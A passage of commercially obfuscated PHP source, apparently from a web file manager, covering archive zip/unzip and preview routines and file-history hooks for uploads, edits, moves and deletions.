array($a—ğñ¯‘©‰[1100] => $a—ğñ¯‘©‰[1107], $a—ğñ¯‘©‰[6] => $Cê½ùêÏê); $D±§¹Æõ¸È = Model($a—ğñ¯‘©‰[590])->getInfo($Cê½ùêÏê[$a—ğñ¯‘©‰[395]]); if ($D±§¹Æõ¸È[$a—ğñ¯‘©‰[397]] == $a—ğñ¯‘©‰[191]) { $Có÷¸¤ãšã = KodIO::clear($D±§¹Æõ¸È[$a—ğñ¯‘©‰[1105]] . $Cê½ùêÏê[$a—ğñ¯‘©‰[1098]]); $Cê½ùêÏê[$a—ğñ¯‘©‰[481]] = $D±§¹Æõ¸È; $Cê½ùêÏê[$a—ğñ¯‘©‰[1082]] = $Có÷¸¤ãšã; $B¶ÄœÉÉ = array($a—ğñ¯‘©‰[1100] => $a—ğñ¯‘©‰[1108], $a—ğñ¯‘©‰[6] => $Cê½ùêÏê); } else { if (!$Có÷¸¤ãšã) { $Có÷¸¤ãšã = $D±§¹Æõ¸È[$a—ğñ¯‘©‰[397]]; } } break; default: $Có÷¸¤ãšã = $Cê½ùêÏê[$a—ğñ¯‘©‰[76]]; $B¶ÄœÉÉ = array($a—ğñ¯‘©‰[1100] => $a—ğñ¯‘©‰[1109]); break; } $aÂŞé²¢İ = $Cê½ùêÏê[$a—ğñ¯‘©‰[76]]; if (!isset(self::$driverCache[$aÂŞé²¢İ])) { $ešÎìêËî = strtolower($B¶ÄœÉÉ[$a—ğñ¯‘©‰[94]]); $Dá‹µ©ÙÉ© = $GLOBALS[$a—ğñ¯‘©‰[6]][$a—ğñ¯‘©‰[88]][$a—ğñ¯‘©‰[826]]; $dÇÒÏ£Âß© = $a—ğñ¯‘©‰[72] . (isset($Dá‹µ©ÙÉ©[$ešÎìêËî]) ? $Dá‹µ©ÙÉ©[$ešÎìêËî] : ucfirst($ešÎìêËî)); if (!class_exists($dÇÒÏ£Âß©)) { show_json("{$dÇÒÏ£Âß©}\40\156\x6f\x74\x20\145\170\x69\163\x74\163\x21", !1); } $AÈèÅí‚áØ = isset($B¶ÄœÉÉ[$a—ğñ¯‘©‰[6]]) ? $B¶ÄœÉÉ[$a—ğñ¯‘©‰[6]] : !1; self::$driverCache[$aÂŞé²¢İ] = new $dÇÒÏ£Âß©($AÈèÅí‚áØ); } goto FÁ÷‡ÂÎ¯; D“ÒÒÑ©¾«: $ešË…Ÿ³ìó->path = $Có÷¸¤ãšã; return $ešË…Ÿ³ìó; goto dêáƒ²óš–; AĞÚİ™İÖµ: $a—ğñ¯‘©‰ =& $_SERVER[Ö‘Øù]; $cÀ»£‘¦áç = $Cê½ùêÏê[$a—ğñ¯‘©‰[1099]]; $fšä¦ˆĞÛ = $Cê½ùêÏê[$a—ğñ¯‘©‰[395]]; goto fÜŸ£Á•§§; FÁ÷‡ÂÎ¯: $ešË…Ÿ³ìó = self::$driverCache[$aÂŞé²¢İ]; $ešË…Ÿ³ìó->pathDriver = $cÀ»£‘¦áç; $ešË…Ÿ³ìó->pathBase = $a—ğñ¯‘©‰[33]; goto fÍóÕ‹¨È®; dêáƒ²óš–: } public static function errorTips($F„Æç¡« ä = false) { goto dïø÷ï•´³; b§ŒÍ•’‹¬: if ($F„Æç¡« ä === -1) { return $A¬›»à«äÚ ? $A¬›»à«äÚ[count($A¬›»à«äÚ) - 1] : $a¬öäğÚ™«[33]; } if ($F„Æç¡« ä === !1) { return implode($a¬öäğÚ™«[229], $A¬›»à«äÚ); } if (count($A¬›»à«äÚ) >= $dãµ²“÷”ø) { $A¬›»à«äÚ = array_slice($A¬›»à«äÚ, $dãµ²“÷”ø * 0.5, $dãµ²“÷”ø); } goto eš·ì‹Ê½è; eš·ì‹Ê½è: $A¬›»à«äÚ[] = $F„Æç¡« ä; write_log($a¬öäğÚ™«[160] . ACTION . $a¬öäğÚ™«[1111] . $F„Æç¡« ä, $a¬öäğÚ™«[1112]); goto B†½™Ó¥Î; dïø÷ï•´³: $a¬öäğÚ™« =& $_SERVER[Ö‘Øù]; static $A¬›»à«äÚ = array(); $dãµ²“÷”ø = 1000; goto b§ŒÍ•’‹¬; B†½™Ó¥Î: } public static function getLastError($fÔ§Õ·ˆ’ë = '') { $CàñêÁß¸ = self::errorTips(-1); return $CàñêÁß¸ ? $CàñêÁß¸ : $fÔ§Õ·ˆ’ë; } } class IOArchive extends IO { function __construct() { parent::__construct(); } private static function local() { static $bÖ¥­Ğà‰¤; if (!$bÖ¥­Ğà‰¤) { $b±œ“öòƒš = IO::init($_SERVER[Ö‘Øù][8]); } return $b±œ“öòƒš; } private static function iconvSystem($Aİˆ²£Õ›ó) { return self::local()->iconvSystem($Aİˆ²£Õ›ó); } private static function iconvApp($Eßóˆ…š«İ) { return self::local()->iconvApp($Eßóˆ…š«İ); } public static function zip($f»¦÷„ÂÇ¬, $eÒ§Œƒ = "\172\151\160", $d‰”¬ªœ°ç = '', $Aô…ƒ£¥¤‚ = REPEAT_RENAME) { goto FÉ¥ß’ ¹; CãÚÀˆ¿: if (count($B¥‰ö–‡‡) > 1) { $dØ‹ì”–ƒõ = IO::info(IO::pathFather($a³³Š´¡Ä [$fê·Šç­’“[76]])); $A·Çàø»õÀ = $dØ‹ì”–ƒõ[$fê·Šç­’“[28]]; } $Bƒˆ•Úá­„ = $b§öò›±â×; if (!$Bƒˆ•Úá­„) { $Bƒˆ•Úá­„ = get_path_father($a³³Š´¡Ä [$fê·Šç­’“[76]]); if (!$d‰”¬ªœ°ç && $Fƒš‘£Î ->getType() == $fê·Šç­’“[106]) { $Bƒˆ•Úá­„ = get_path_father($Fƒš‘£Î ->path); } $E¬ÆÊš®²È = IO::info($Bƒˆ•Úá­„); if (!$E¬ÆÊš®²È[$fê·Šç­’“[196]]) { show_json(LNG($fê·Šç­’“[1114]), !1); } } goto f¹éòªÓ„Ä; A¼×ö¸ä¦: if ($d‰”¬ªœ°ç || !$b§öò›±â×) { if ($b§öò›±â× && strstr($b§öò›±â×, TEMP_FILES)) { $f ÎÉÆØÍ‹ = $B¥‰ö–‡‡ = array(); recursion_dir($Bƒˆ•Úá­„, $f ÎÉÆØÍ‹, $B¥‰ö–‡‡, 0); foreach ($f ÎÉÆØÍ‹ as $f‹ñË†‹©Á) { del_dir($f‹ñË†‹©Á); } foreach ($B¥‰ö–‡‡ as $cÃÓ…™¦Ÿ) { if ($cÃÓ…™¦Ÿ == $D†â¦°¡Çğ) { continue; } del_file($cÃÓ…™¦Ÿ); } } return $B©Ö¤¯øğæ; } $BäÍ¬¸Íë = self::pathFather($a³³Š´¡Ä [$fê·Šç­’“[76]]); $b™ö´‘²‚ = self::move($B©Ö¤¯øğæ, $BäÍ¬¸Íë, $Aô…ƒ£¥¤‚); goto B•Š³èª¼; FÉ¥ß’ ¹: $fê·Šç­’“ =& $_SERVER[Ö‘Øù]; $Fƒš‘£Î  = self::init($f»¦÷„ÂÇ¬[0][$fê·Šç­’“[76]]); $a³³Š´¡Ä  = self::info($f»¦÷„ÂÇ¬[0][$fê·Šç­’“[76]]); goto f”Š—šò‰‹; Fè÷„´‹İ: foreach ($B¥‰ö–‡‡ as $aªáåã‘é => $Fªêµô±Ÿ©) { $B¥‰ö–‡‡[$aªáåã‘é] = self::iconvSystem($Fªêµô±Ÿ©); } KodArchive::create($D†â¦°¡Çğ, $B¥‰ö–‡‡); if (!IO::exist($B©Ö¤¯øğæ)) { if ($b§öò›±â×) { del_dir($b§öò›±â×); } show_json(LNG($fê·Šç­’“[1115]), !1); } goto A¼×ö¸ä¦; B•Š³èª¼: if (!$b™ö´‘²‚) { del_dir($b§öò›±â×); show_json(LNG($fê·Šç­’“[1115]), !1); } del_dir($b§öò›±â×); return $b™ö´‘²‚; goto eîƒîÒø¼È; f¹éòªÓ„Ä: $B©Ö¤¯øğæ = $Bƒˆ•Úá­„ . $A·Çàø»õÀ . $fê·Šç­’“[95] . $eÒ§Œƒ; $B©Ö¤¯øğæ = get_filename_auto($B©Ö¤¯øğæ, $fê·Šç­’“[33], $Aô…ƒ£¥¤‚); $D†â¦°¡Çğ = self::iconvSystem($B©Ö¤¯øğæ); goto Fè÷„´‹İ; f”Š—šò‰‹: $b§öò›±â× = !1; if (!$d‰”¬ªœ°ç && $Fƒš‘£Î ->getType() == $fê·Šç­’“[106]) { $B¥‰ö–‡‡ = self::zipFileList($f»¦÷„ÂÇ¬); } else { $b§öò›±â× = $d‰”¬ªœ°ç ? $d‰”¬ªœ°ç : TEMP_FILES . $fê·Šç­’“[1113] . time() . rand_string(8) . $fê·Šç­’“[8]; mk_dir($b§öò›±â×); $B¥‰ö–‡‡ = self::zipFileList($f»¦÷„ÂÇ¬, $b§öò›±â×); } $A·Çàø»õÀ = $a³³Š´¡Ä [$fê·Šç­’“[28]]; goto CãÚÀˆ¿; eîƒîÒø¼È: } public static function unzip($DîÈµæ¢™¢, $FæÎó°»Ò» = "\x72\x65\160\154\x61\x63\x65") { goto A°·»¾ÕÇ‰; b£ğĞìŞ­´: foreach ($e¿íÚì³İ as $f‚éñìÒº”) { $f‚éñìÒº” = self::iconvApp($f‚éñìÒº”); self::move($f‚éñìÒº”, $cÎÆ•·‰â®, $FæÎó°»Ò»); } del_dir($CÜÁ„ §äÈ); if (!$C„åŒŞ©»õ) { del_file($F¡ÏŠĞ‰Š‡); } goto cˆª¥ŠäŠµ; A°·»¾ÕÇ‰: $EÂ¿Ò«›¡â =& $_SERVER[Ö‘Øù]; $fÌÛ¤œì‡ = $DîÈµæ¢™¢[$EÂ¿Ò«›¡â[76]]; $cÎÆ•·‰â® = $DîÈµæ¢™¢[$EÂ¿Ò«›¡â[1116]]; goto D§òµá¼æ; CÕŸÀÏ”µº: Hook::trigger($EÂ¿Ò«›¡â[1123], $CÜÁ„ §äÈ); recursion_dir($CÜÁ„ §äÈ, $Eµ¿½¤¬¦ì, $eÊ™Œ†«”ø, 0); $e¿íÚì³İ = array_merge($Eµ¿½¤¬¦ì, $eÊ™Œ†«”ø); goto b£ğĞìŞ­´; FŠÉ‹ã„†â: mk_dir($CÜÁ„ §äÈ); $dµÒºğÆ£¹ = self::fileExt($cÓé”·ÍÈì); $F¡ÏŠĞ‰Š‡ = $CÜÁ„ §äÈ . $EÂ¿Ò«›¡â[95] . $dµÒºğÆ£¹; goto fÓë‘Â§­¬; cˆª¥ŠäŠµ: return !0; goto fÄóƒ™‡ÇÓ; cîöÔª²µ¾: $a¢˜ÇÃ˜¤… = KodArchive::extract($F¡ÏŠĞ‰Š‡, $CÜÁ„ §äÈ . $EÂ¿Ò«›¡â[8], $EÇÛÕÙÄ); self::archiveExt(); if (!$a¢˜ÇÃ˜¤…[$EÂ¿Ò«›¡â[1120]]) { show_json($EÂ¿Ò«›¡â[1121] . $a¢˜ÇÃ˜¤…[$EÂ¿Ò«›¡â[1122]], !1); } goto CÕŸÀÏ”µº; D§òµá¼æ: if (!($cÓé”·ÍÈì = parent::info($fÌÛ¤œì‡))) { show_json(LNG($EÂ¿Ò«›¡â[1117]), !1); } if (!($DâÈ‘ÍÒå³ = parent::infoFull($cÎÆ•·‰â®))) { $cÎÆ•·‰â® = parent::mkdir($cÎÆ•·‰â®); $DâÈ‘ÍÒå³ = array($EÂ¿Ò«›¡â[76] => $cÎÆ•·‰â®); } else { if (isset($DâÈ‘ÍÒå³[$EÂ¿Ò«›¡â[397]]) && trim($DâÈ‘ÍÒå³[$EÂ¿Ò«›¡â[76]], $EÂ¿Ò«›¡â[8]) != trim($cÎÆ•·‰â®, $EÂ¿Ò«›¡â[8])) { $dõÆùæ®ÜŒ = KodIO::make($DâÈ‘ÍÒå³[$EÂ¿Ò«›¡â[493]]); $AöË Õ©”§ = parent::fileNameAuto($dõÆùæ®ÜŒ, $DâÈ‘ÍÒå³[$EÂ¿Ò«›¡â[28]], REPEAT_RENAME_FOLDER, !0); $cÎÆ•·‰â® = parent::mkdir($dõÆùæ®ÜŒ . $AöË Õ©”§); $DâÈ‘ÍÒå³ = array($EÂ¿Ò«›¡â[76] => $cÎÆ•·‰â®); } } $cÎÆ•·‰â® = $DâÈ‘ÍÒå³[$EÂ¿Ò«›¡â[76]]; goto eÇ³¡Ì‚; eÇ³¡Ì‚: $döŠŒíö¾Í = self::tmpFileName($cÓé”·ÍÈì); $CÜÁ„ §äÈ = TEMP_FILES . $döŠŒíö¾Í; del_dir($CÜÁ„ §äÈ); goto FŠÉ‹ã„†â; fÓë‘Â§­¬: if (!@file_exists(self::iconvSystem($F¡ÏŠĞ‰Š‡))) { $C„åŒŞ©»õ = self::localFilePath($fÌÛ¤œì‡, $dµÒºğÆ£¹); $F¡ÏŠĞ‰Š‡ = $C„åŒŞ©»õ ? $C„åŒŞ©»õ : parent::download($fÌÛ¤œì‡, $F¡ÏŠĞ‰Š‡); } $F¡ÏŠĞ‰Š‡ = self::iconvSystem($F¡ÏŠĞ‰Š‡); $EÇÛÕÙÄ = isset($DîÈµæ¢™¢[$EÂ¿Ò«›¡â[1118]]) ? $DîÈµæ¢™¢[$EÂ¿Ò«›¡â[1118]] : $EÂ¿Ò«›¡â[1119]; goto cîöÔª²µ¾; fÄóƒ™‡ÇÓ: } public static function unzipList($B§ÀÕ×ù) { goto E®À¡Ìãİ; bÎÄ±ÅÒ‘­: if (isset($A„äîÌö¢ç)) { $a…Ó§¤Ì = array($A„äîÌö¢ç[$D‚¶Ñë§í½[76]], $A„äîÌö¢ç[$D‚¶Ñë§í½[1124]], $A„äîÌö¢ç[$D‚¶Ñë§í½[28]]); $d³Ê†ÎŞùå = md5(implode($D‚¶Ñë§í½[71], $a…Ó§¤Ì)) . $D‚¶Ñë§í½[95] . get_path_ext($A„äîÌö¢ç[$D‚¶Ñë§í½[28]]); } else { $a…Ó§¤Ì = array($BÈ™õ±¬Ù[$D‚¶Ñë§í½[28]], $BÈ™õ±¬Ù[$D‚¶Ñë§í½[76]], $BÈ™õ±¬Ù[$D‚¶Ñë§í½[78]]); $d³Ê†ÎŞùå = md5(implode($D‚¶Ñë§í½[71], $a…Ó§¤Ì)) . $D‚¶Ñë§í½[95] . $aÆ ßíëŠ´; } if ($C‰‘Ãà˜Üä == -1) { $bŞÓ©ùö¨÷ = IO_PATH_SYSTEM_TEMP . "\172\x69\160\126\151\145\167\57{$a§çšÛåœ³}\57{$d³Ê†ÎŞùå}\x2e\x6c\157\x67"; $eÜ¸‘İ•èŒ = self::infoFull($bŞÓ©ùö¨÷); if ($eÜ¸‘İ•èŒ) { $bŞÓ©ùö¨÷ = $eÜ¸‘İ•èŒ[$D‚¶Ñë§í½[76]]; $FÊÃ—Ò¥é· = self::getContent($bŞÓ©ùö¨÷); if ($FÊÃ—Ò¥é·) { $Bºàù ‚¥¸ = json_decode($FÊÃ—Ò¥é·, !0); if (count($Bºàù ‚¥¸) >= $B”ÈÓ‘İ´˜) { show_json(sprintf(LNG($D‚¶Ñë§í½[1126]), count($Bºàù ‚¥¸)), !1); } return $Bºàù ‚¥¸; } } else { $bŞÓ©ùö¨÷ = self::mkfile($bŞÓ©ùö¨÷); } } $CõÔò®‘ƒ  = TEMP_FILES . $a§çšÛåœ³; goto eÊ¸íœØô; eÊ¸íœØô: if (!is_dir($CõÔò®‘ƒ )) { mk_dir($CõÔò®‘ƒ ); } $D»µ¾˜åĞÜ = $CõÔò®‘ƒ  . $D‚¶Ñë§í½[8] . $d³Ê†ÎŞùå; if (!@file_exists(self::iconvSystem($D»µ¾˜åĞÜ))) { if (isset($A„äîÌö¢ç)) { url_request($B‚ÈÑ—ÌÎ, $D‚¶Ñë§í½[1127], $D»µ¾˜åĞÜ); } else { $AáİÅĞì¼Ğ = self::localFilePath($B‚ÈÑ—ÌÎ, $aÆ ßíëŠ´); $D»µ¾˜åĞÜ = $AáİÅĞì¼Ğ ? $AáİÅĞì¼Ğ : self::download($B‚ÈÑ—ÌÎ, $D»µ¾˜åĞÜ); } } goto EøÂœÕ¬ËŞ; E®À¡Ìãİ: $D‚¶Ñë§í½ =& $_SERVER[Ö‘Øù]; $B‚ÈÑ—ÌÎ = $B§ÀÕ×ù[$D‚¶Ñë§í½[76]]; $C‰‘Ãà˜Üä = isset($B§ÀÕ×ù[$D‚¶Ñë§í½[1124]]) ? $B§ÀÕ×ù[$D‚¶Ñë§í½[1124]] : -1; goto DíÜ’ÕÈàÖ; DíÜ’ÕÈàÖ: $B”ÈÓ‘İ´˜ = 50000; if (request_url_safe($B‚ÈÑ—ÌÎ)) { $A„äîÌö¢ç = parse_url_query($B‚ÈÑ—ÌÎ); if (!isset($A„äîÌö¢ç[$D‚¶Ñë§í½[76]])) { show_json($D‚¶Ñë§í½[1125], !1); } } $b¥íäÛŠ¯ = isset($A„äîÌö¢ç) ? $A„äîÌö¢ç[$D‚¶Ñë§í½[76]] : $B‚ÈÑ—ÌÎ; goto D­“çˆ›ßÉ; D­“çˆ›ßÉ: $BÈ™õ±¬Ù = self::info($b¥íäÛŠ¯); $aÆ ßíëŠ´ = self::fileExt($BÈ™õ±¬Ù); $a§çšÛåœ³ = self::tmpFileName($BÈ™õ±¬Ù); goto bÎÄ±ÅÒ‘­; c§İ…â¶ˆã: self::archiveExt(); del_dir($CõÔò®‘ƒ ); if (!$a™Ğš¨¥’[$D‚¶Ñë§í½[1120]]) { show_json($a™Ğš¨¥’[$D‚¶Ñë§í½[1122]], !1); } goto e½ØÉ“‚¡; e½ØÉ“‚¡: $Bºàù ‚¥¸ = json_encode($a™Ğš¨¥’[$D‚¶Ñë§í½[1122]]); self::setContent($bŞÓ©ùö¨÷, $Bºàù ‚¥¸); if (count($a™Ğš¨¥’[$D‚¶Ñë§í½[1122]]) >= $B”ÈÓ‘İ´˜) { show_json(sprintf(LNG($D‚¶Ñë§í½[1126]), count($a™Ğš¨¥’[$D‚¶Ñë§í½[1122]])), !1); } goto CãĞˆµŠƒ§; EøÂœÕ¬ËŞ: $D»µ¾˜åĞÜ = self::iconvSystem($D»µ¾˜åĞÜ); if ($C‰‘Ãà˜Üä >= 0) { $B×Š’ç‡³ = isset($B§ÀÕ×ù[$D‚¶Ñë§í½[1128]]) ? $B§ÀÕ×ù[$D‚¶Ñë§í½[1128]] : !1; $cÄëé¾ = isset($B§ÀÕ×ù[$D‚¶Ñë§í½[28]]) ? $B§ÀÕ×ù[$D‚¶Ñë§í½[28]] : $D‚¶Ñë§í½[33]; KodArchive::filePreview($D»µ¾˜åĞÜ, $C‰‘Ãà˜Üä, $B×Š’ç‡³, $cÄëé¾); self::archiveExt(); die; } $a™Ğš¨¥’ = KodArchive::listContent($D»µ¾˜åĞÜ); goto c§İ…â¶ˆã; CãĞˆµŠƒ§: return $a™Ğš¨¥’[$D‚¶Ñë§í½[1122]]; goto b¬æ³ó‰ŸÑ; b¬æ³ó‰ŸÑ: } private static function fileExt($Bˆ³ÓÚÂö) { $Eä’•²¬ÆÖ =& $_SERVER[Ö‘Øù]; $då‰Í¹³É = $Bˆ³ÓÚÂö[$Eä’•²¬ÆÖ[168]]; if ($då‰Í¹³É == $Eä’•²¬ÆÖ[1129]) { $eáîÑ•ÊÆ = $Eä’•²¬ÆÖ[1130]; if (substr($Bˆ³ÓÚÂö[$Eä’•²¬ÆÖ[28]], -strlen($eáîÑ•ÊÆ)) == $eáîÑ•ÊÆ) { $då‰Í¹³É = $Eä’•²¬ÆÖ[1131]; } } self::archiveExt($då‰Í¹³É); return $då‰Í¹³É; } private static function zipFileList($a÷¾ÂÙ‚Ñ, $F¿öŸ»¤ = false) { $D†Ûªëê·· =& $_SERVER[Ö‘Øù]; $E¾äßÌ¶† = array(); foreach ($a÷¾ÂÙ‚Ñ as $ağİ™„ºæ) { $b£¤ÔÕâµ = $ağİ™„ºæ[$D†Ûªëê··[76]]; if ($F¿öŸ»¤) { $b£¤ÔÕâµ = self::copy($ağİ™„ºæ[$D†Ûªëê··[76]], $F¿öŸ»¤, $D†Ûªëê··[818]); } else { $E°¡ÚÚ‡©ù = self::init($ağİ™„ºæ[$D†Ûªëê··[76]]); if ($E°¡ÚÚ‡©ù->getType() == $D†Ûªëê··[106]) { $b£¤ÔÕâµ = $E°¡ÚÚ‡©ù->path; } } if ($b£¤ÔÕâµ && self::local()->exist($b£¤ÔÕâµ)) { $E¾äßÌ¶†[$ağİ™„ºæ[$D†Ûªëê··[76]]] = $b£¤ÔÕâµ; } } if (!empty($E¾äßÌ¶†)) { return array_values($E¾äßÌ¶†); } show_json(LNG($D†Ûªëê··[1095]), !1); } public static function tmpFileName($F¼äáï‘Œ‚) { $CÓ› ğ¿Àø =& $_SERVER[Ö‘Øù]; $a¤Ùöñ£ïÙ = array($F¼äáï‘Œ‚[$CÓ› ğ¿Àø[28]], $F¼äáï‘Œ‚[$CÓ› ğ¿Àø[76]], $F¼äáï‘Œ‚[$CÓ› ğ¿Àø[78]], $F¼äáï‘Œ‚[$CÓ› ğ¿Àø[516]]); return md5(implode($CÓ› ğ¿Àø[71], $a¤Ùöñ£ïÙ)); } private static function localFilePath($F„’ÖÒº», $aÌìš«ÇĞ) { goto CŸÈ»ò¬; D‡ˆØà÷„‹: if ($D§‚ÊÁÀ¹Ù[$bˆğŞº»çœ[29]] == KodIO::KOD_SOURCE) { $bëÁ™«¥ì‘ = Model($bˆğŞº»çœ[825])->fileInfoGet(KodIO::sourceID($F„’ÖÒº»)); if (!$bëÁ™«¥ì‘[$bˆğŞº»çœ[76]]) { show_json($bˆğŞº»çœ[1134], !1); } $F„’ÖÒº» = $bëÁ™«¥ì‘[$bˆğŞº»çœ[76]]; } $dÔ«áš¡ˆó = self::init($F„’ÖÒº»); $dÃ’Ô¢ÕÇ¥ = $dÔ«áš¡ˆó->getType(); goto E›¾œ„¢™÷; CŸÈ»ò¬: $bˆğŞº»çœ =& $_SERVER[Ö‘Øù]; if ($aÌìš«ÇĞ == $bˆğŞº»çœ[1132] && strtoupper(substr(PHP_OS, 0, 3)) == $bˆğŞº»çœ[1133]) { return !1; } $D§‚ÊÁÀ¹Ù = KodIO::parse($F„’ÖÒº»); goto D‡ˆØà÷„‹; E›¾œ„¢™÷: if ($dÃ’Ô¢ÕÇ¥ == $bˆğŞº»çœ[106] || $dÃ’Ô¢ÕÇ¥ == $bˆğŞº»çœ[1135]) { if (!$dÔ«áš¡ˆó->exist($dÔ«áš¡ˆó->path)) { show_json(LNG($bˆğŞº»çœ[105]), !1); } return $dÔ«áš¡ˆó->path; } return !1; goto CÏ–•­Ë¶Ê; CÏ–•­Ë¶Ê: } private static function archiveExt($b‚”Ÿ¨—š« = '') { $GLOBALS[$_SERVER[Ö‘Øù][1136]] = $b‚”Ÿ¨—š«; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto f–ù¡âŸË³; f–ù¡âŸË³: $Cº„éÇ¢æá =& $_SERVER[Ö‘Øù]; $a—¹³…­¸ = $GLOBALS[$Cº„éÇ¢æá[6]][$Cº„éÇ¢æá[88]]; if ($a—¹³…­¸[$Cº„éÇ¢æá[1137]] != 1) { return; } goto AÓÚƒÚêÓÕ; A´¯Œ˜Û¨Í: Hook::bind($Cº„éÇ¢æá[1148], $Cº„éÇ¢æá[1149]); Hook::bind($Cº„éÇ¢æá[1150], $Cº„éÇ¢æá[1151]); goto AôíĞÀô; Eã¡Ñ¨¥„: Hook::bind($Cº„éÇ¢æá[1142], $Cº„éÇ¢æá[1143]); Hook::bind($Cº„éÇ¢æá[1144], $Cº„éÇ¢æá[1145]); Hook::bind($Cº„éÇ¢æá[1146], $Cº„éÇ¢æá[1147]); goto A´¯Œ˜Û¨Í; AÓÚƒÚêÓÕ: if ($a—¹³…­¸[$Cº„éÇ¢æá[1138]] <= 0) { return; } if (isset($_REQUEST[$Cº„éÇ¢æá[1139]]) && $_REQUEST[$Cº„éÇ¢æá[1139]] == $Cº„éÇ¢æá[87]) { return; } Hook::bind($Cº„éÇ¢æá[1140], $Cº„éÇ¢æá[1141]); goto Eã¡Ñ¨¥„; AôíĞÀô: } public static function eventBeforeUpload($dïòÆùã¾Ç) { if ($dïòÆùã¾Ç[3] && $dïòÆùã¾Ç[3] != REPEAT_REPLACE) { return; } $eŒÉ‰âÜ‰­ = self::parsePath($dïòÆùã¾Ç[0]); if (!$eŒÉ‰âÜ‰­) { return; } self::add($eŒÉ‰âÜ‰­); } public static function eventBeforeEdit($EÄ­İˆ‚‚) { $C›Œ„×¨Æ­ = self::parsePath($EÄ­İˆ‚‚[0]); if (!$C›Œ„×¨Æ­) { return; } self::add($C›Œ„×¨Æ­); } public static function eventBeforeCopyFile($eß´ÃÂ–½æ, $bšÒºÙŒáÔ, $d¶À©ñÀ¼Ô, $cñ¿ê³å¤, $cÂ¶¯Ÿ¢Ùó, $EßÄÔê¯†È) { $eó†Éà¨Õ = $d¶À©ñÀ¼Ô->getPathOuter($cñ¿ê³å¤); $f­»†ªóË‘ = self::parsePath($eó†Éà¨Õ); if (!$f­»†ªóË‘) { return; } self::add($f­»†ªóË‘); } public static function eventBeforeRename($aÇ¾‚³®óê) { $Aè„²éÎ’Ò =& $_SERVER[Ö‘Øù]; $A‚»à‚­©Ü = self::parsePath($aÇ¾‚³®óê[0]); if (!$A‚»à‚­©Ü) { return; } $D˜Üˆ²ìÎæ = self::checkInHistory($A‚»à‚­©Ü); if (!$D˜Üˆ²ìÎæ) { return; } if ($D˜Üˆ²ìÎæ[$Aè„²éÎ’Ò[29]] == $Aè„²éÎ’Ò[193]) { $d…ÓñŠ›î = self::listData($A‚»à‚­©Ü); if ($d…ÓñŠ›î && $d…ÓñŠ›î[$Aè„²éÎ’Ò[367]]) { self::moveHistory($A‚»à‚­©Ü, $aÇ¾‚³®óê[1]); } } else { IO::rename($D˜Üˆ²ìÎæ[$Aè„²éÎ’Ò[76]], $aÇ¾‚³®óê[1]); } } public static function eventBeforeMove($fˆ·ƒó·Ç—) { goto Bñ„›ŠĞ†Ë; a‹‰š‡İ×: if ($Eß¯¼´[$CõØ¦ë¦ë[29]] == $CõØ¦ë¦ë[193]) { $Cšèƒ˜Ò®À = self::listData($c÷ñÏƒİäÂ); $f÷”„¬³à´ = rtrim($CïÇ‹°Ñß¤, $CõØ¦ë¦ë[8]) . $CõØ¦ë¦ë[8] . ($f¬šãç¿áŠ ? $f¬šãç¿áŠ : get_path_this($c÷ñÏƒİäÂ)); $EšÁãäˆè™ = self::listData($f÷”„¬³à´); if ($Cšèƒ˜Ò®À && $Cšèƒ˜Ò®À[$CõØ¦ë¦ë[367]] && $EšÁãäˆè™ && $EšÁãäˆè™[$CõØ¦ë¦ë[367]]) { return self::clear($c÷ñÏƒİäÂ); } if ($Cšèƒ˜Ò®À && $Cšèƒ˜Ò®À[$CõØ¦ë¦ë[367]]) { self::moveHistory($c÷ñÏƒİäÂ, $f¬šãç¿áŠ, $b‹´Œ™ÊÓŒ); } } else { IO::move($Eß¯¼´[$CõØ¦ë¦ë[76]], $b‹´Œ™ÊÓŒ, !1, $f¬šãç¿áŠ); self::clearEmptyFolder(IO::pathFather($Eß¯¼´[$CõØ¦ë¦ë[76]])); } goto díÚİ±Ùæø; AäÜä‚×Ï­: $CïÇ‹°Ñß¤ = self::parsePath($fˆ·ƒó·Ç—[1]); if (!$CïÇ‹°Ñß¤) { return; } $f¬šãç¿áŠ = $fˆ·ƒó·Ç—[3]; goto DÎä‰†Š‘; DÎä‰†Š‘: $Eß¯¼´ = self::checkInHistory($c÷ñÏƒİäÂ); if (!$Eß¯¼´) { return; } $b‹´Œ™ÊÓŒ = self::pathHistory($CïÇ‹°Ñß¤); goto a‹‰š‡İ×; Bñ„›ŠĞ†Ë: $CõØ¦ë¦ë =& $_SERVER[Ö‘Øù]; $c÷ñÏƒİäÂ = self::parsePath($fˆ·ƒó·Ç—[0]); if (!$c÷ñÏƒİäÂ) { return; } goto AäÜä‚×Ï­; díÚİ±Ùæø: } public static function eventAfterRemove($aàËÚÔ ê, $D½•ä—§¢Œ) { goto CŸ‰ÂîîÌ¯; CŸ‰ÂîîÌ¯: $a˜•Æİ¯ã =& $_SERVER[Ö‘Øù]; if (!$D½•ä—§¢Œ) { return; } $cªÒØà¯„ƒ = self::parsePath($aàËÚÔ ê[0]); goto Bøœª‘…ÎÓ; Bøœª‘…ÎÓ: if (!$cªÒØà¯„ƒ) { return; } $cŸ¤ê‰¸•ì = self::checkInHistory($cªÒØà¯„ƒ); if (!$cŸ¤ê‰¸•ì) { return; } goto DêĞ°’¤ÈÃ; DêĞ°’¤ÈÃ: if ($cŸ¤ê‰¸•ì[$a˜•Æİ¯ã[29]] == $a˜•Æİ¯ã[193]) { $BÚĞêßƒÔä = self::listData($cªÒØà¯„ƒ, !1); if ($BÚĞêßƒÔä && $BÚĞêßƒÔä[$a˜•Æİ¯ã[367]]) { self::clear($cªÒØà¯„ƒ, !1); } } else { IO::remove($cŸ¤ê‰¸•ì[$a˜•Æİ¯ã[76]]); self::clearEmptyFolder(IO::pathFather($cŸ¤ê‰¸•ì[$a˜•Æİ¯ã[76]])); } goto D¶ôí×ğ¶; D¶ôí×ğ¶: } private static function checkInHistory($dÓô¶¾Ş§) { $cÉ—±÷«´Œ = self::pathHistory($dÓô¶¾Ş§); if (!IO::exist($cÉ—±÷«´Œ)) { $cÉ—±÷«´Œ .= $_SERVER[Ö‘Øù][1152]; } return IO::exist($cÉ—±÷«´Œ) ? IO::info($cÉ—±÷«´Œ) : !1; } private static function parsePath($bÇ‰´°½¸) { goto DÀ¡§‰†òÊ; b×ŠÉ±êÏÌ: $BƒáÄŸŠõÒ = KodIO::parse($bÇ‰´°½¸); $A÷ô¤íÕƒ• = $BƒáÄŸŠõÒ[$aÇÂõ÷§õâ[29]]; $d±·öšôİÏ = !$A÷ô¤íÕƒ• || $A÷ô¤íÕƒ• == KodIO::KOD_IO || $A÷ô¤íÕƒ• == 